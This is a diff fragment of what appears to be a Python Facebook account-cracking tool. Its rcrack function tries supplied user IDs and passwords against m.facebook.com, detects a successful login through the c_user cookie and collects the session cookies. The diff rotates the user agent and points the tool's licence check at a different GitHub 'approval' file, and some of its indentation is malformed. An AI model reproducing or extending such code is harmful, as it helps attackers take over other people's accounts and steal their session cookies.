@@ -338,10 +338,8 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
-}
-
-            response = requests.get('https://m.facebook.com/', cookies=cookies, headers=headers)
+    'user-agent':pro}
+             response = requests.get('https://m.facebook.com/', cookies=cookies, headers=headers)
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
@@ -376,7 +374,7 @@ def superuser():
     uuid = str(os.geteuid()) + str(os.getlogin()) 
     id = "99".join(uuid)
     print(logo)
-    DARK=requests.get("https://github.com/nayeemvai/V12/tree/main").text
+    DARK=requests.get("https://github.com/nayeemvai/V12/blob/main/Approvell.txt").text
     if id in DARK:
         os.system('clear')
         print(logo)
